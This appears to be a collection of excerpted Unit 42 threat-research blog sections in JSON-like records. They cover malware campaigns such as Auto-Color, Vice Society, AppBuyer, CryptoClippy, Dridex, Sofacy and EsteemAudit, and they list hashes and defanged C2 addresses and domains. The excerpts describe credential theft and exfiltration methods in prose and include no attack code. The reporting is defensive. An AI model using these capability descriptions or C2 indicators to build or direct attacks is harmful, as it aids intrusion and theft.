229,160 bytes \nFile name:egg \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 3 malware from Auto-color\nSHA256 hash:a1b09720edcab4d396a53ec568fe6f4ab2851ad00c954255bf1a0c04a9d53d0a\nFile size: 229,160 bytes \nFile name:edu \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 4 malware from Auto-color\nSHA256 hash:bace40f886aac1bab03bf26f2f463ac418616bacc956ed97045b7c3072f02d6b\nFile size: 229,160 bytes \nFile name:door \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 5 malware from Auto-color\nSHA256 hash:e1c86a578e8d0b272e2df2d6dd9033c842c7ab5b09cda72c588e0410dc3048f7\nFile size: 229,160 bytes \nFile name:exup \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 6 malware from Auto-color\nSHA256 hash:85a77f08fd66aeabc887cb7d4eb8362259afa9c3699a70e3b81efac9042bb255\nFile size: 229,160 bytes \nFile name:law \nFile type: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked \nFile description: Sample 7 malware from Auto-color\nSHA256 hash:bf503b5eb456f74187a17bb8c08bccc9b3d91a7f0f6fd50110540b051510d1ca\nFile size: 35,160 bytes \nFile name:libcext.so.2 \nFile type: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked \nFile description: Library Implant from Auto-color\nMalicious C2 IP Addresses from Auto-Color:\n146[.]70[.]41[.]178:443 - log sample \n216[.]245[.]184[.]214:443 - edus/egg sample \n146[.]70[.]87[.]67:443 - edu/door sample \n65[.]38[.]121[.]64:443 - exup sample \n206[.]189[.]149[.]191:443 - law sample", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has collected multiple spear phishing emails, weaponized document files, and payloads that targeted various offices of the Mongolian government during the time period of August 2015 and February 2016. The phishing emails and document files leveraged a variety of geopolitically sensitive subject matters as attractive lures, such as events in Beijing, the Dalai Lama, North Korea relations, the Zika virus, and various legitimate appearing announcements. As we began to analyze and tear down the various samples we collected, we found significant overlaps with previously reported and documented adversary groups, attack campaigns, and their toolsets, exemplifying the concept of theDigital Quartermaster.\nThe concept of the Digital Quartermaster is not a particularly new one; it is the idea that there is a group, or groups whose mission is to supply and maintain malicious tools in support of cyber espionage operations. The existence of a Digital Quartermaster has been discussed within the intelligence community for some time, but it is not often that sufficient overlaps exist between what appear to be separate toolsets to confidently claim this idea is indeed in use. The data Unit 42 has collected and analyzed however, does strongly point to the possibility that while there may be multiple operations groups, a Digital Quartermaster may be the one supplying and maintaining the tools used.", "source": "Palo"}, {"title": "Conclusion", "content": "Unit 42 often speaks of sharing threat intelligence, tools, and procedures amongst the security industry, often times pointing to the fact that the adversaries we are up against on an everyday basis are doing the exact same. Still, as a community, when we do publicize adversary groups or campaigns, there is a tendency to encapsulate each and place them in their own isolated bubbles, directly contradicting the message of sharing amongst the adversary. The reasoning behind this is not meant to be hypocritical \u2013 it is simply more straightforward for identification and ingestion purposes to be able to silo each group or campaign rather than come to the conclusion thateverygroup or campaign is somehow related due to the sharing nature of the adversaries. We must acknowledge the fact however, that in general many attacksarerelated, even if they do appear significantly different or do not share the same TTPs as observed previously\nThe collection of data we have analyzed strongly points to the fact that a Digital Quartermaster may exist amongst the adversary. The strong overlaps within the tactics used in the toolsets as well as links in infrastructure indicate it is likely that a singular entity is responsible for deployment and maintenance of the tools used, in conjunction with a separate operator group responsible for the actual execution of the cyber espionage operations.\nPalo Alto Networks customers are protected through our next-generation security platform:\nWildFire successfully detects BBSRAT, Cmstar, and the weaponized documents as malicious \nAutoFocus identifies the tools used under theCmstarandBBSRATtags \nTraps actively detects and prevents exploitation of both CVE-2012-0158 and CVE-2014-1761 \nThe C2 domains and files mentioned in this report are blocked through Threat Prevention", "source": "Palo"}, {"title": "Indicators", "content": "5beb50d95c1e720143ca0004f5172cb8881d75f6c9f434ceaff59f34fa1fe37810090692ff40758a08bd66f806e0f2c831b4b9742bbf3d19c250e778de638f5744dbf05bc81d17542a656525772e0f0973b603704f213278036d8ffc999bb79a91ffe6fab7b33ff47b184b59356408951176c670cad3afcde79aa8464374acd36f3d4fb64de9ae61776fd19a8eba3d1d828e7e26bb89ace00c7843a57c5f6e8ae88ea5eb642eaf832f8399d0337ba9eb1563862ddee68c26a74409a7384b9bb968f97bf3d03b1733944c25ff4933e4e03d973ccdd73d9528f4d68806b826735e00ddae5bbc2ddf29954749519ecfb3978a68db6237ebea8e646a898c353053cec2ebaf4366835e16f34cc7f0b56f8eaf80a9818375c98672bc678bb4107b4d8caa86f4587423c2ff677aebae604614030f9f4d38280409501662ab4e4fe20c2afc21814a5f9ed2f6bef9e15b113d00f9291a6553c1e02cc0b4c185c6030eca457e031a04e570cddda907d0b4b7af19ce60dc481394dfb3813796ce0e6d0793050b0e6b40a63710b4f7e6d00d7a4a86e6db2df720fef48640ab6d9d88352a48905c7e3cde4d286909154e9a5ee5a5d061a1f0efaa9875fb50c9073e1e8b6cfaef\n567a5b54d6c153cdd2ddd2b084f1f66fc87587dd691cd2ba8e30d689328a673fcd3b8e4f3a6379dc36fedf96041e292b4195d03f27221167bce7302678fb2540\njowwln.cocolco[.]compagbine.ofhloe[.]comcdaklle.housejjk[.]com\nc3253409cccee20caa7b77312eb89bdbe8920cdb44f3fabfe5e2eeb78023c1b83e2c0d60c7677d3ead690b1b6d4d7c5aaa2d218679634ac305ef3d75b5688e6a3a7348d546d85a179f9d52ff83b20004136ee584993c23a8bfe5c168c00fbaa919ba40a7fa332b750c7d93385dd51bd08ee63f91cedb4ae5a93f9f33ecb38c444e1d59042336c3758e77c5c521f60ae262aad01bf7265581de54e869a02b65bc\nhttp://thbaw.ofhloe[.]com/cgl-bin/conime.cgihttp://dolimy.celeinkec[.]com/cgl-bin/upl.cgihttp://question.eboregi[.]comhttp://pplime.savecarrots[.]com/cgl-bin/upsd.cgihttp://dolimy.celeinkec[.]com/bin/r0206/update.tmp", "source": "Palo"}, {"title": "Introduction", "content": "During a recent incident response (IR) engagement, the Unit 42 team identified that theVice Society ransomware gangexfiltrated data from a victim network using a custom builtMicrosoft PowerShell(PS) script. We'll break down the script used, explaining how each function works in order to shed light on this method of data exfiltration.\nRansomware gangs use a plethora of methods to steal data from their victims' networks. Some gangs bring in outside tools, including tools such as FileZilla, WinSCP and rclone. Other gangs useliving off the land binaries and scripts (LOLBAS)methods, such as PS scripts, copy/paste via Remote Desktop Protocol (RDP) and Microsoft's Win32 API (e.g.,Wininet.dllcalls). Let's examine what happens when a PS script is used to automate the data exfiltration stage of a ransomware attack.\nPalo Alto Networks customers receive protections from and mitigations for the script described below in the following ways:\nThe XQL query provided below can be used with Cortex XDR to help track the presence of this script. \nThe Unit 42 Incident Response team can provide personalized assistance.\nAdditionally, theYARA rulewe attached at the end of this post can be used to detect this script.", "source": "Palo"}, {"title": "Conclusion", "content": "Vice Society's PowerShell data exfiltration script is a simple tool for data exfiltration. Multi-processing and queuing are used to ensure the script does not consume too many system resources. However, the script's focus on files over 10 KB with file extensions and in directories that meet its include list means that the script will not exfiltrate data that doesn't fit this description.\nUnfortunately, the nature of PS scripting within the Windows environment makes this type of threat difficult to prevent outright. We have provided tips and tricks related to detection and hunting this type of threat in theDetection and Huntingsection. Using these tips, especially using the provided YARA rule, we wish you the best of luck in identifying this threat. Don't let the ransomware gangs automate the loss of your data!\nPalo Alto Networks customers receive protections from and mitigations for the script described below in the following ways:\nThe XQL query provided below can be used with Cortex XDR to help track the presence of this script. \nThe Unit 42 Incident Response team can provide personalized assistance.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Indicators", "content": "Since the script in question was recovered from an Event ID 4104 WEL event, a hash of the true, original file as it may have resided on disk is not available. However, we have included the filename of the script along with the contents recovered from the script in this section.\nNote:We have optednotto release any IP addresses or port numbers. Furthermore, these IoCs willnotbe provided upon request.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks recently found and analyzed a new iOS malware affecting jailbroken iOS devices in the wild. The malware will connect to C&C server, download and execute malicious executable files, hook network APIs to steal user's Apple ID and password and upload to the attacker's server, and simulate Apple's proprietary protocols to buy apps from the official App Store by victim's identity. We named this new family AppBuyer.", "source": "Palo"}, {"title": "Background", "content": "The AppBuyer wasfirst mentionedby four members of the WeiPhone Technical Group at May 18th, 2014. They remotely assisted a user to find out why some apps periodically had been installed onto his jailbroken iPhone, and finally located two strange files on that device. They found that these files would download, execute and delete other executable files from the Internet. Lastly, they tried to identify the attacker through analyzing the C&C server's domain name through the samples used. They also provided these samples for downloading.\nIn the same day, being noticed by this group, weposted a quick introductionto this new threat in the mobile.malware Google group with a temporary name \"Updatesrv\".\nHowever, the WeiPhone Technical Group didn't explain how the samples install other apps into infected devices. On the other side, the sample's C&C servers are still alive currently, which may impact more users. The team did some deeper analysis on the samples to disclose its mechanisms and provide solutions and suggestions to defeat it.", "source": "Palo"}, {"title": "Conclusion", "content": "Now, we know the updatesrv will effectively run three times on infected devices:\nIn the first run, it will download a executable files to generate a unique UUID and save into /etc/uuid; \nIn the second run, it will download a Cydia Substrate tweak to intercept all HTTP/HTTPS session for stealing user's Apple ID and password and uploading to the attacker's server; \nIn the third run, it will download a fake gzip utility that will login into the App Store via the user's ID and password, and purchase additional Apps.\nHence we classify this sample as a Trojan, and name it AppBuyer.", "source": "Palo"}, {"title": "Introduction", "content": "As we head towards the end of the year it's common to reflect on the year almost behind us and topredict what the new year approaching will bring in terms of security challenges. This blog is part of a series that describe malware trends seen in the EMEA (Europe Middle East and Africa) region over the last six months of 2016.\nNot long after joining Palo Alto Networks and the Unit 42 Threat Research team I was tasked with authoring and publishing monthly regional threat reports for internal use that focused on the EMEA region using data from our AutoFocus Threat Intelligence Service. The report contents and structure are fluid but some constants exist too, such as tips, take-aways and tools described for readers to learn and act upon to improve their security posture. We are working towards making the reports themselves public, meanwhile, this blog, and future blogs in the series, serve to publish summary information from each of the reports. This blog refers to data extracted from the June and July reports.\nEMEA is the largest region on earth in terms of land mass spanning 4 continents from Greenland in the North and West, to the Cape of Good Hope in the South of Africa and as far as Iran in the East but location is pretty much where the commonality ends. The EMEA region is incredibly diverse with more countries than other regions, more languages, arguably more ethnicities and vastly contrasting GDP (Gross Domestic Product) figures as well as population sizes. Despite EMEA accounting for approximately one third of the world's GDP, per capita, it also includes both the richest and poorest countries. All this amounts to the region being a great place to conduct business however, unfortunately, cyber criminals also believe the same and find it a lucrative market. The malware seen here is not necessarily unique to the region but like the region it is diverse!\nBreaking-down the EMEA region into sub-regions is necessary to create digestible threat reports with meaningful data, however even that is not simple due to disparate cybersecurity postures and policies, maturity levels and, indeed, social and economic aspects of each country. That being said, the reports thus far cover segments of the region that are somewhat similar in terms of most of those aspects. For example, the first report covers countries in western Europe with similar GDP (Gross Domestic Product) amount. The second report covers some countries that are located in the Middle East region and are considered as emerging markets.", "source": "Palo"}, {"title": "Conclusion", "content": "EMEA is a socially and economically diverse region with many interesting assets whether they be citizen data, financial information or natural resources and, as such, is a target for cyber criminals the world over.\nIt's interesting to consider that information-stealing malware, such as PredatorPain, is prevalent in countries that have a more service-based economy that manage and process plenty of user data and personally identifiable information (PII).\nSome of the other countries analyzed that are more reliant on industrial sectors and natural resources seem to have more cyber attacks using RATs providing full control to remote attackers and use of key-logging technologies to harvest data.\nCurrently on its fourth iteration the regional threat reports have proved useful and, based on feedback, discussions are now ongoing about releasing publicly and expanding beyond the EMEA region as well, so watch this space so you too can get a better understanding of what's going on in different countries, sub-regions and industry verticals around the world.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently published a blog on a newly identified Trojan calledBookworm, which discussed the architecture and capabilities of the malware and alluded to Thailand being the focus of the threat actors' campaigns.\nIn this blog, we will discuss the current attack campaign along with the associated threat infrastructure and the actor's tactics, techniques and procedures (TTPs). The following list provides a summary of the threat actors TTPs, which we will cover in this blog:\nActively attacking targets in Thailand, specifically government entities. \nUses Bookworm Trojan as the payload in attacks. \nHas access to compromised servers that they use to download Bookworm. \nKnown to use spear-phishing as the attack vector to compromise targets, but have access to compromised web servers that could facilitate strategic web compromise (SWC) as an attack vector in the future. \nUses standalone Flash Player to play slideshows that contain pictures of current events in Thailand as decoy documents, but also use the legitimate Flash Player installation application as a decoy in some instances. \nUses date codes to track campaigns or Trojan version. If date codes are indeed used for campaign identifiers, then the dates precede attacks or current event seen in decoys by 6 to 18 days, which provides a glimpse into the development and operational tempo of this group. \nUse of large command and control (C2) infrastructure, which heavily favors dynamic DNS domains for C2 servers. \nDeployed Poison Ivy, PlugX, FFRAT and Scieron malware families.", "source": "Palo"}, {"title": "Conclusion", "content": "Threat actors have targeted the government of Thailand and delivered the newly discovered Bookworm Trojan since July 2015. The actors appear to follow a set playbook, as the observed TTPs are fairly static within each attack in this campaign. The threat actors have continually used Flash Player installers and Flash slideshows for decoys. The decoy slideshows all contain photos from very meaningful events to individuals in Thailand, suggesting that the actors continually look for impactful events to use to disguise their attacks.\nThe vast majority of systems communicating with Bookworm C2 servers are within the Bangkok metropolitan area where a majority of the government of Thailand exists. While the current campaign has targeted the Thai government, Unit 42 believes the threat actors will target other governments to deliver Bookworm in future campaigns.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently discovered a malware campaign targeting Portuguese speakers, which aims to redirect cryptocurrency away from legitimate users' wallets and into wallets controlled by threat actors instead. To do this, the campaign uses a type of malware known as a cryptocurrency clipper, which monitors the victim's clipboard for signs that a cryptocurrency wallet address is being copied.\nThe malware, which we call CryptoClippy, seeks to replace the user's actual wallet address with the threat actor's, causing the user to inadvertently send cryptocurrency to the threat actor. Unit 42 Managed Threat Hunting found victims across manufacturing, IT services, and real estate industries, though they likely impacted the personal wallet addresses of someone using their work machine.\nTo deliver the malware to users' computers, threat actors in this campaign used both Google Ads and traffic distribution systems (TDS) to redirect victims to malicious domains that are impersonating the legitimate WhatsApp Web application. They use this to ensure victims are real users, and also that they're Portuguese speakers. For users who are sent to malicious domains, the threat attempts to trick them into downloading malicious files, including either.zipor.exefiles, that lead to the final payload.\nPalo Alto Networks customers receive protections against this campaign throughCortex XDR. TheAdvanced URL FilteringandDNS Securitycloud-delivered security services for the Next-Generation Firewall identify domains associated with the CryptoClippy campaign as malicious.", "source": "Palo"}, {"title": "Conclusion", "content": "The overall proliferation of cryptocurrency-focused malware has been gaining momentum the last few years. The threat actor in this particular instance has implemented the following activities in their campaigns:\nIncorporating malvertising \nUsing TDS \nLimiting the scope of targeting \nKeying the payloads to the environment \nEmploying more complex and stealthier techniques to hide the overall functionality of the loader and clipper \nCreating custom algorithms for data manipulation\nThese practices highlight an interesting shift, especially in cryptocurrency-targeting malware. We often see two particular methods for the distribution of such threats. They may be pushed using a botnet like withLaplas Clipper and Smokeloader, or there may be an underlying malware-as-a-service (MaaS) element such as withEternity Clipper.\nProtections and Mitigations\nPalo Alto Networks customers usingCortex XDRreceive protections at the endpoints from the malware techniques described in this blog. Palo Alto Networks Next-Generation Firewalls withAdvanced URL FilteringandDNS Securityidentify domains associated with the CryptoClippy campaign as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently identified a variant of MNKit-weaponized documents being used to deliver LURK0 Gh0st, NetTraveler, and Saker payloads. The documents were delivered to targets involved with universities, NGOs, and political/human rights groups concerning Islam and South Asia. Reuse of this MNKit variant, sender email addresses, email subject lines, attachment filenames, command and control domains, XOR keys, and targeted recipients show a connection between the different payload families delivered.\nMNKit is the name given to a builder that generates CVE-2012-0158 exploit documents. The documents are inMHTML formatand install a malicious payload on the compromised host. We believe MNKit is privately shared between multiple attack groups, but is not widely available.\nInformation about previous attack campaigns using MNKit is available in the following reports:\nCmstar Downloader: Lurid and Enfal's New Cousin \nNetTraveler Spear-Phishing Email Targets Diplomat of Uzbekistan \nScarlet Mimic: Years-Long Espionage Campaign Targets Minority Activists\nFor more details on MNKit, see the Sophos publication,Office exploit generators.\nTypical MNKit MHTML files have usedUser123orUser323as the Author and LastAuthor element values within their DocumentProperties sections andC:/2673C891/Doc1.files/as a file directory location. The samples discussed in this blog useUser323andUser426as Author and LastAuthor element values andC:/23456789/Doc1.files/as a file directory location.", "source": "Palo"}, {"title": "Introduction", "content": "To improve our detection of suspicious network activity, we leveraged a deep learning method to profile and detect malicious DNS traffic patterns. Based on these DNS profiles, we developed multiple detection modules, each designed to identify suspicious domains from different perspectives. We will explore how these DNS traffic patterns correlate with specific types of cyberattacks' activities through various case studies.\nDNS resolution traffic, as the initial stage of network communication, provides critical insights into cyberthreats behind malicious network traffic. Analyzing DNS traffic patterns and characteristics can help us detect and prevent unauthorized infiltration attempts.\nFor example, upon gaining access to a host within a victim's network, an attacker often deploys malware that periodically connects to its command and control (C2) servers. This results in DNS traffic patterns for these C2 domains that can be markedly different from typical benign DNS activity.\nOur detector captured 170 emerging suspicious domains in May 2024. The resulting signatures blocked approximately 374,000 malicious DNS requests every day.\nThe malicious DNS traffic detector is deployed on theAdvanced DNS Security serviceto provide real-time protection against various network threats. The detected malicious domains are also shared withAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Malicious DNS requests generated by attackers will present patterns that are distinct and different from legitimate DNS traffic. This insight allows us to identify malicious domains based on DNS traffic patterns and characteristics.\nTo capture the attacking indicators from the DNS traffic, we developed an autoencoder-based deep learning profiling solution to vectorize steaming DNS request traffic. Our autoencoder model is efficient and scalable to encode the DNS trends in real-time. Once we create a baseline of the DNS traffic, we leverage comprehensive threat intelligence to build the classifier that identifies the representative request patterns for various cyberthreats.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 published ablogat the beginning of May titled \"Prince of Persia,\" in which we described the discovery of a decade-long campaign using a formerly unknown malware family, Infy, that targeted government and industry interests worldwide.\nSubsequent to the publishing of this article, through cooperation with the parties responsible for the C2 domains, Unit 42 researchers successfully gained control of multiple C2 domains. This disabled the attacker's access to their victims in this campaign, provided further insight into the targets currently victimized in this operation, and enabled the notification of affected parties.", "source": "Palo"}, {"title": "Appendix", "content": "The malware uses a different algorithm than that used for encrypting the malware strings to encrypt the exfiltration data, including:\nKeylogger data + language. \nMalware logs - installation time, DLL path and name, log path, number of downloads, number of successful/failed connections. \nInformation about the victim computer: Time zone, list of drives and types, running processes, disk info.\nFirst the malware adds 1 to all bytes, then an encryption key is initialized based on the victim computer name (the offset in the key is calculated by sum of the computer name letters %key length). Then the key is used to encrypt the data (see decrypt function). The encrypted data is then base64 encoded.\nExfiltration data decryption python code:", "source": "Palo"}, {"title": "IOC", "content": "Infy version 31: f07e85143e057ee565c25db2a9f36491102d4e526ffb02c83e580712ec00eb27\nInfy \"M\" version 8.0: 583349B7A2385A1E8DE682A43351798CA113CBBB80686193ECF9A61E6942786A\n5.9.94.34138.201.0.134138.201.47.150144.76.250.205138.201.47.158138.201.47.153us1s2[.]strangled[.]netuvps1[.]cotbm[.]comgstat[.]strangled[.]netsecup[.]soon[.]itp208[.]ige[.]eslu[.]ige[.]esupdateserver1[.]comupdateserver3[.]comupdatebox4[.]combestupdateserver[.]combestupdateserver2[.]combestbox3[.]comsafehostline[.]comyouripinfo[.]combestupser[.]awardspace[.]infobox4035[.]netbox4036[.]netbox4037[.]netbox4038[.]netbox4039[.]netbox4040[.]netbox4041[.]netbox4042[.]netbox4043[.]netbox4044[.]netbox4045[.]netbox4046[.]netbox4047[.]netbox4048[.]netbox4049[.]netbox4050[.]netbox4051[.]netbox4052[.]netbox4053[.]netbox4054[.]netbox4055[.]netbox4056[.]netbox4057[.]netbox4058[.]netbox4059[.]netbox4060[.]netbox4061[.]netbox4062[.]netbox4063[.]netbox4064[.]netbox4065[.]netbox4066[.]netbox4067[.]netbox4068[.]netbox4069[.]netbox4070[.]netbox4071[.]netbox4072[.]netbox4075[.]netbox4078[.]netbox4079[.]netbox4080[.]netbox4081[.]netbox4082[.]netbox4083[.]netbox4084[.]netbox4085[.]netbox4086[.]netbox4087[.]netbox4088[.]netbox4089[.]netbox4090[.]net", "source": "Palo"}, {"title": "Introduction", "content": "InPart 1of this two-part blog series, we discussed briefly how XLL files are exploited to deploy Agent Tesla. During December 2021, we continued to observe Dridex and Agent Tesla exploiting XLL in different ways for initial payload delivery. A more in-depth look at the Dridex infection chain follows.\nThreat actors behind Dridex have been using various delivery mechanisms over the years. In early 2017, we observed plain VBScript and JavaScript were being used. In later years, we observed many variations, including Microsoft Office files (DOC, XLS) compressed in zip. In 2020, we found the malware using Discord and other legitimate services to download the final payload. More recently, during December 2021, we received various Dridex samples, which were exploiting XLL and XLM 4.0 in combination with Discord and OneDrive to download the final payload.\nIn our previous blog focused onXLL files and Agent Tesla, we saw the abuse of the legitimate Excel-DNA framework. In this blog post, we will look into other infection chains. We will discuss different stages of the XLL and Excel 4 (XLM) droppers that deliver Dridex samples. We will also briefly look at the Dridex Loader.\nPalo Alto Networks customers receive protections against the attacks discussed here throughCortex XDRor theWildFirecloud-delivered security subscription for theNext-Generation Firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "We observed a continued evolution of the infection chain. We saw how malware authors can evade detection engines using legitimate services such as Discord and OneDrive. We analyzed how malware authors continue to add more stages in the infection chain.\nLastly, we briefly looked into the Dridex payload. Although the final payload was similar to the previous Dridex version in terms of behaviour, we noticed an additional unpacking stage and a couple of new changes in the API hashing function. These simple yet powerful tricks that can be challenging for malware analysts, helping the malware avoid detection and slow down analysis.\nPalo Alto Networks customers receive protections against the attacks discussed here throughCortex XDRor theWildFirecloud-delivered security subscription for theNext-Generation Firewall.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Introduction", "content": "In April, a group known as the \"Shadow Brokers\" released a cache of stolen information that included multiple tools to exploit vulnerabilities in various versions of Microsoft Windows. The most famous of these is an exploit tool called \"EternalBlue\" which was repurposed to spread the WanaCrypt0r ransomware/worm earlier this month. Another tool released in this dump is \"EsteemAudit\", which exploits CVE-2017-9073, a vulnerability in the Windows Remote Desktop system on Windows XP and Windows Server 2003. Both versions of this operating system are no longer supported by Microsoft (XP ended in 2014, Server 2003 in 2015) and as such Microsoft has not released a patch for the vulnerability.\nOrganizations that still rely on these out-of-date operating systems need to ensure they are defending against exploitation of this vulnerability, as it allows a remote attacker to take control over the system without any authentication.\nPalo Alto Networks defends our customers' systems from this exploit in the following ways:\nTrapsprevents exploitation of this vulnerability on Windows XP and Server 2003 hosts. \nThreat Prevention Signature 32533 released in Content Update 692 detects the exploit in the NGFW.\nOrganizations that cannot upgrade systems and do not use the protections describe above should considerdisabling the smart card modulethrough Group Policy or in the registry.\nExploitation of the vulnerability is complex, but the EsteemAudit tool makes it possible for novices to use it. The remainder of this blog includes a detailed analysis of where the vulnerability exists and how EsteemAudit exploits it.", "source": "Palo"}, {"title": "Introduction", "content": "Remote RDP exploits are the stuff of legend. Fortunately, no public remote exploit for Windows RDP has been available since the NT4/Win98 era. In April 2017, a group using the name \"The Shadowbrokers\"releasedan RDP exploit named EsteemAudit which attacks the remote desktop service on Windows 2003 and Windows XP by using an inter-chunk heap overflow in the Smart Card component gpkscp.dll. In this blog, we will first describe some of the internals of remote desktop protocol and mechanism, and then analyze the EsteemAudit.exe itself. Next we will analyze the details about how to deal with the RDP data in kernel and user land, how the inter-chunk heap overflow occurs, and how to exploit this inter-chunk heap overflow to execute shellcode on the vulnerable system. Finally, we will introduce the possible detection methods and how to mitigate this vulnerability without a patch.", "source": "Palo"}, {"title": "Conclusion", "content": "RDP is a very useful but very complex component of Windows. Based on our analysis of the EsteemAudit exploit, we find that the vulnerability itself is not obscure, but it took quite a bit of effort to write a successful exploit. Interestingly, gpkcsp choose a global variable to store the data sent by the client, it supplies a capacity of controlling the arbitrary data in already-known address in the remote server without ASLR. This is a powerful feature for exploit authors to take advantage of. In any case, EsteemAudit is a reliable and powerful RDP exploit tool for Windows XP and Windows 2003. Users should take steps to ensure their Windows XP and Windows Server 2003 are protected through one of the mitigation steps listed above. A network vulnerability like this one can be used in a \"worm-able\" fashion, similar to the WanaCrypt0r attacks which had global impact earlier this month.\nRegister for Ignite '17 Security ConferenceVancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.", "source": "Palo"}, {"title": "Introduction", "content": "The Sofacy group, also known as APT28, is a well-known threat group that frequently conducts cyber espionage campaigns. Recently, Unit 42 identified a spear phishing e-mail from the Sofacy group that targeted the United States government. The e-mail was sent from a potentially compromised account belonging to the Ministry of Foreign Affairs of another government entity and carried the Carberp variant of the Sofacy Trojan. The developer implemented a clever persistence mechanism in the Trojan, one which had not been observed in previous attacks. The focus of this blog will be on the attacks and the infrastructure associated with Sofacy using the new persistence mechanism as a correlation point.", "source": "Palo"}, {"title": "Conclusion", "content": "The Sofacy group continues its attack campaigns on government organizations, specifically the U.S. government in this latest spear-phishing example. The threat group added a new persistence mechanism that requires user interaction by loading its payload into Microsoft Office applications when opened, which may help the actors to evade detection. The use of this new persistence method shows the continued development of tactics and techniques employed by this threat group, often times in clever ways as we observed in this instance.\nPalo Alto Networks customers are protected from the new Sofacy Carberp variant and can gather additional information using the following tools:\nWildFire detection of all known samples as malicious \nAll known C2s are classified as malicious in PAN-DB \nAutoFocus tags have been createdSofacyCarberp", "source": "Palo"}, {"title": "Indicators", "content": "03cb76bdc619fac422d2b954adfa511e7ecabc106adce804b1834581b5913bca (Exercise_Noble_Partner_16.rtf)12572c2fc2b0298ffd4305ca532317dc8b97ddfd0a05671066fe594997ec38f5 (Putin_Is_Being_Pushed_to_Prepare_for_War.rtf and Russian anti-Nato troops.rtf)\nc2551c4e6521ac72982cb952503a2e6f016356e02ee31dea36c713141d4f3785 (btecache.dll)be1cfa10fcf2668ae01b98579b345ebe87dab77b6b1581c368d1aba9fd2f10a0 (bitsprex3.dll)fbd5c2cf1c1f17402cc313fe3266b097a46e08f48b971570ef4667fbfd6b7301 (amdcache.dll)\n69940a20ab9abb31a03fcefe6de92a16ed474bbdff3288498851afc12a834261 (svchost.dll)aeeab3272a2ed2157ebf67f74c00fafc787a2b9bbaa17a03be1e23d4cb273632 (clconfg.dll)dfa8a85e26c07a348a854130c652dcc6d29b203ee230ce0603c83d9f11bbcacc (iprpp.dll)57d230ddaf92e2d0504e5bb12abf52062114fb8980c5ecc413116b1d6ffedf1b (clconfg.dll)\n191.101.31.6munimonoce[.]comwscapi[.]comtabsync[.]netstorsvc[.]orgservicecdp[.]com", "source": "Palo"}, {"title": "Introduction", "content": "The attacks against cloud-hosted infrastructure are increasing, and the proof is in the analysis of security alert trends. Recent research reveals that organizations saw nearly five times as many daily cloud-based alerts at the end of 2024 compared to the start of the year. This means attackers have significantly intensified their focus on targeting and breaching cloud infrastructure.\nThese alerts aren't simply noise. We've seen the greatest increases in high severity alerts, meaning indicators of attacks are successfully targeting critical cloud resources as explained in Table 1.\nTable 1. Criticality of certain cloud resources.\nOf particular note, attackers frequently targeted serverless IAM tokens resulting in remote command-line usage. These are significant because they can be used to gain access to an organization's larger cloud environment. As part of the increase of cloud alerts, there were three times as many remote command-line access events utilizing identity access and management (IAM) tokens, and credentials that are used by cloud serverless functions.\nWe also identified other upward trends in alerting:\nAn 116% increase in IAM-based \"impossible travel event\" alerts (i.e., login events from distant geographic areas within a narrow time window) \nA 60% increase in IAM application programming interface (API) requests from outside regions for compute resources (cloud virtual machine) \nA peak 45% increase in the number of cloud snapshot exports during November 2024 \nA 305% increase in the number of suspicious downloads of multiple cloud storage objects\nIdentity is the defense perimeter of cloud infrastructure. Attackers target IAM tokens and credentials as they hold the keys to the cloud kingdom, allowing attackers to move laterally, escalate their permissions and perform additional malicious operations. The rise in the number of access attempts and usage of sensitive IAM service accounts means attackers across the globe have their sites set on cloud resources.\nAttackers target cloud storage services as they often contain sensitive data. We saw a notable increase in the number of suspicious cloud storage object downloads and image snapshot exports. Suspicious cloud storage object download alerts trigger when a single IAM-based identity downloads a large number of storage objects within a narrow time window. This can signify malicious operations such as ransomware or extortion. Image snapshots are targeted by attackers as snapshots can contain sensitive data regarding cloud infrastructure and IAM credentials that could allow the attacker to escalate permissions and move laterally within a victim cloud environment.\nThese examples illustrate the immediate need to protect cloud environments, not solely with foundational cloud security posture management (CSPM) tools, but in cooperation with tools that detect and prevent malicious runtime operations as they occur.\nBy deploying Cortex Cloud's runtime cloud security tooling - also called Cloud Detection and Response (CDR) - security teams can identify and prevent malicious events within cloud environments.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "Cloud security posture management (CSPM) 